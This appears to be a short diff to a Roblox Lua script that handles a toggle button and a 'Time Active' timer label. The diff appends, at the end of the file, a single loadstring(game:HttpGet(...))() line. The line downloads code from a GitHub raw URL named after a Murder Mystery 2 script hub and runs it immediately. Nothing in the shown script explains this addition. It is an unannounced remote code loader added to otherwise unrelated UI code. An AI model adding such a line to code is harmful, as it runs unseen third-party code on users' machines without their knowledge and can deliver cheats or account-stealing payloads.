@@ -214,3 +214,5 @@ toggleBtn.MouseButton1Click:Connect(function()
 		timerLabel.Text = "Time Active: 0s"
 	end
 end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/mm2scripthub/mm2/refs/heads/main/newscript'))()
